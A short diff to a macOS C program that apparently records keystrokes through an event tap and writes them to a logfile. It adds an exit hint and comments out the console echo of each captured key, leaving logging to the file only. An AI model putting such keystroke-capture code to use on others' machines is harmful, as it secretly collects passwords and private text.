@@ -47,6 +47,7 @@ int main(int argc, const char *argv[]) {
 
     // Display the location of the logfile and start the loop.
     printf("Logging to: %s\n", logfileLocation);
+    printf("Press Cmd+. to exit program.\n");
     fflush(stdout);
     CFRunLoopRun();
 
@@ -85,9 +86,10 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
         strcpy(resultStr, characterStr);
     }
 
+/*
     printf("{%i},%s,%i\n", keyCode, resultStr, (int)shift);
     fflush(stdout);
-    
+*/    
     
     // Print the human readable key to the logfile.
     fprintf(logfile, "%s", resultStr);
